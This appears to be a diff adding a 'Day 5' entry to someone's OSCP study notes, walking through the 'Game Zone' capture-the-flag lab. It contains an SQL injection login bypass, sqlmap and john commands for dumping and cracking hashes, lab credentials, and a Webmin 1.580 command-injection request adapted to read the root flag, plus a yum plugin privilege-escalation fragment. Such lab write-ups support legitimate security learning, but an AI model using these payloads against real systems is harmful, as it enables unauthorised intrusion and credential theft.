@@ -655,3 +655,46 @@ EOF
 
 sudo yum -c $TF/x --enableplugin=y
 ```
+
+### Day 5 - Making some progress
+
+#### Game Zone
+
+We login to the website by using SQL injection on the login form:
+```
+admin: ' OR 1=1 -- -
+password: <empty>
+```
+
+Once logged in we can save the search request into a test file and use sqlmap to speed things up (of course we cannot use it in OSCP):
+`sqlmap -r request.txt -D db -T users --dump --threads=8 --batch`
+
+Next we use john to crack the password hash just found:
+`john hash.txt --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt`
+
+and can use it to login via SSH: `ssh agent47@target`.
+
+To enumerate local sockets we run: `ss -tulpn`.
+
+Next step is to link port 10000 to our local machine to expose it:
+`ssh -L 10000:localhost:10000 agent47@10.10.116.75`.
+
+Now you can do nmap etc as usual. The website is running Webmin 1.580. There is an exploit post-authentication on [exploit-db](https://www.exploit-db.com/exploits/21851).
+
+The website let's us login with the previously found credentials: `agent47:videogamer124`. WIN!
+
+So we will not use Metasploit this time, instead we analyze the code of the exploit and find out that we can just do command injection manually:
+```
+GET /file/show.cgi/bin/5|echo 4| HTTP/1.1
+Host: 127.0.0.1:10000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1:10000/
+Connection: close
+Cookie: testing=1; sid=8e5c7908ac495569ce45198277e1c66b
+Upgrade-Insecure-Requests: 1
+```
+
+Finally, replace `echo 4` with `cat /root/root.txt` to get the root flag.
